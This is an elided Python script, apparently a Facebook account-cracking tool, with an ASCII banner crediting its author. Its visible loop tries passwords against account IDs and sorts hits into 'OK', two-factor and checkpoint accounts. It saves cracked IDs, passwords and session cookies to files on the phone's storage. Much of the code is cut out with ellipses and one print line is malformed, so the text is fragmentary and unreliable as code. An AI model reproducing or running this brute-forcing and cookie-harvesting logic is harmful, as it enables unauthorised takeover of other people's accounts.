...
╚═╝╚═╝     ╚═╝   ╚═╝   ╚═╝╚═╝  ╚═╝╚══════╝
{40*"="} \x1b[1;97m
 [{G}+{W}] AUTHOR : IMTIAZ AHMED
 [{G}+{W}] GITHUB : KING-FB
 [{G}+{W}] FACEBOOK : IMTIAZ AHMED
 [{G}+{W}] YOU TUBE : IMTIAZ XXX                       
 [{G}+{W}] VERSION  : {G}{0-1-0}{W}
{40*"="}\x1b[1;97m""")
############------[ RANDOM NUM ]------#########
def Main():
	logo()
...
def graphrm(id,psd,tid):
	...
	for psw in psd:
		...
		if 'session_key' in lo:
			...
			print(f'\r\r{G}[IMTIAZ-OK] {iid} | {psw}{W}');os.system('espeak -a 500 "ok id"');ok.append(id);open('/sdcard/IMTIAZ-OK.txt', 'a').write(iid+' | '+psw+' | '+id+'  ------------>>>'+coki+"\n")
			if 'y' in cokix:print(f'\r\r{R}[{G}COOKIES🍪{R}]{W} : {G}{coki}{E}');print(f"{W}{40*'-'}{E}")
			break
		elif twfx in str(lo):
			iid = lo['error']['error_data']['uid']
			print(f'\r\r{BL}[IMTIAZ-2F] {iid} | {psw}{W}');os.system('espeak -a 500 "two,f id"');open('/sdcard/IMTIAZ-2F.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
			twf.append(id)
			break
			...
			if iid in ok:pass
				...
				if 'y' in cpx:
					print(f'\r\r{[IMTIAZ-CP] {iid} | {psw}{W}');cp.append(id);os.system('espeak -a 500 "cp id"');open('/sdcard/IMTIAZ-CP.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
			break
		else:continue
	lop+=1
Main()
